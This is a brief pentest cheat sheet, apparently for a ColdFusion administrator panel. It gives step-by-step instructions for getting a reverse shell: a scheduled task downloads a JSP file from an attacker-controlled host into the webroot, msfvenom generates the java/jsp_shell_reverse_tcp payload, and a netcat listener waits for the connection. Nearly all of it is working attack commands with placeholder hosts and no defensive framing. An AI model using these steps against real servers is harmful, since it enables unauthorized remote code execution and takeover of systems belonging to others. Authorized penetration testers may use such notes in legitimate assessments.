### Get path to webroot
```
Server Settings > Mappings
```

### Get reverse shell using scheduled task
```
Debugging & Logging > Scheduled Tasks > Schedule New Task
```

### Insert parameters
```
Task Name: <name>
URL: http://<lhost>/<file>.jsp
Check: Save output to a file
File: <path>\<file>.jsp
Submit
```

### Generate reverse shell
```
msfvenom -p java/jsp_shell_reverse_tcp lhost=<lhost> lport=<lport> -f raw > <file>.jsp
```

### Start listener
```
nc -lnvp <lport>
```

### Start task
```
Actions > Run Scheduled Task
```

